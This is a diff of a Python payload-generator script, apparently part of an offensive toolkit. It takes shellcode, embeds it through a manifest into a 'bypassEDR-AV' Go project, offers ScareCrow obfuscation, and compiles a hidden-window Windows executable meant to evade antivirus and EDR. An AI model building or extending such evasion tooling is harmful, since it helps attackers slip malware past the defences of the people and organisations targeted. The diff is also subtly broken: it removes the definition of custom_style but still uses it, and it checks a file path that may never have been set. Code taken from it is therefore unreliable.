@@ -36,9 +36,29 @@ def process_shellcode_and_update_manifest(shellcode_file, manifest_path):
             f.write(updated_manifest_content)
 
         print("Manifest updated successfully.")
+
+        # Update go.mod from version 1.23.0 to just 1.23
+        result = subprocess.run('''sed -i 's/^go [0-9]\+\.[0-9]\+\(\.[0-9]\+\)*$/go 1.23/' /app/bypassEDR-AV/go.mod''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        result = subprocess.run("cat /app/bypassEDR-AV/go.mod", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        print(result.stdout)
+
+        # Update the RSC
+        result = subprocess.run('''GOOS=windows GOARCH=amd64 /usr/bin/go build -ldflags="-H=windowsgui -s -w"''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        # Rename the Payload
+        print("\033[32m[+] Checking is payload has been created:\033[0m")
+        # Ensuring payload was created 
+        result = subprocess.run("ls -lah /app/bypassEDR-AV/edr.exe", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        print(result.stdout)
+
+        # Move the payload over 
+
     except Exception as e:
         print(f"Error: {e}")
         sys.exit(1)
+
+        # Compile Payload
+
+        # Move Payload Over to /app/payloads directory
 
 def exe():
     # Display Choices for Encryption Type
@@ -85,87 +105,56 @@ def aes():
         print(result.stdout)
 
 def shellcode():
-    print("Shellcode option selected.")  # Add logic for shellcode if needed
-    # Define the directory
-    directory = "/app/payloads"
+    print("Shellcode option selected.")
+    # Use an absolute path for payloads
+    payloads_dir = "/app/payloads"
 
-    # Check if the directory exists
-    if not os.path.exists(directory):
-        print(f"Directory '{directory}' does not exist.")
+    # Check if the payloads directory exists
+    if not os.path.exists(payloads_dir):
+        print(f"Error: Directory '{payloads_dir}' does not exist.")
         return
 
-    # Display all files in the directory
-    files = [file for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]
-
-    # Check if there are files in the directory
+    # List files in the payloads directory
+    files = [f for f in os.listdir(payloads_dir) if os.path.isfile(os.path.join(payloads_dir, f))]
     if not files:
-        print("No files found in the directory.")
+        print(f"No files found in the directory: {payloads_dir}")
         return
 
-    # Use Questionary to let the user select a file
+    print(f"Files in payloads directory: {files}")
     selected_file = questionary.select(
         "Select a file:",
         choices=files
     ).ask()
 
-    # Store the user's choice in a variable
     if selected_file:
-        selected_file_path = os.path.join(directory, selected_file)
+        selected_file_path = os.path.join(payloads_dir, selected_file)
         print(f"Payload selected: {selected_file_path}")
 
-    # Ask User to Choose Shellcode Technique
-    custom_style = Style([("choice", "fg:blue")])  # Choices will appear in blue
+    # Validate file existence
+    if not os.path.isfile(selected_file_path):
+        print(f"Error: File '{selected_file_path}' does not exist.")
+        return
 
+    # Proceed with shellcode obfuscation
     choice = questionary.select(
         "Shellcode Obfuscation Technique:",
         choices=["AVBypass Manifest", "ScareCrow", "Exit"],
         style=custom_style
     ).ask()
 
-    process_shellcode_and_update_manifest(
-       shellcode_file=selected_file_path,  # Use the selected file as the shellcode_file
-       manifest_path="bypassEDR-AV/manifiesto.txt"
-     )
-
-    # ##################AVBypass
     if choice == "AVBypass Manifest":
-        # Ensure demon.bin is present (WORKING)
-        command = f"ls payloads"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        print(result.stdout)
+        print("Using AVBypass Manifest.")
+        # Ensure manifest path exists
+        manifest_path = "/app/bypassEDR-AV/manifiesto.txt"
+        if not os.path.isfile(manifest_path):
+            print(f"Error: Manifest file '{manifest_path}' does not exist.")
+            return
 
-        # Set gopath
-        command = f"export PATH=$PATH:$HOME/go/bin"
-        
-        # Change the current working directory to bypassEDR-AV
-        try:
-            os.chdir("bypassEDR-AV")
-            print(f"Changed working directory to: {os.getcwd()}")
-        except FileNotFoundError:
-            print("Error: bypassEDR-AV directory not found.")
-            exit(1)
+        process_shellcode_and_update_manifest(
+            shellcode_file=selected_file_path,
+            manifest_path=manifest_path
+        )
 
-        # Step 1: Update manifest
-        command = "python3 /app/update_manifest.py"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        print(result.stdout)
-        print(result.stderr)
-
-        # Step 2: Update RSC
-        command = "rsrc -manifest manifiesto.txt"
-
-        # Step 3: Build the payload
-        command = '''GOOS=windows GOARCH=amd64 /usr/bin/go build -ldflags="-H=windowsgui -s -w"'''
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-
-        # Copy payload back a directory
-        command = f"cp edr.exe ../payloads/payload.exe"
-       
-        # Check if edr.exe successfully built
-        if os.path.isfile("edr.exe"):
-            print("\033[32m[+] Payload successfully generated, saved to payloads/payload.exe\033[0m")
-        else:
-            print("[-] Payload failed to generate")
 
 ascii_art = r"""
 +-------------------------------------------------------------+
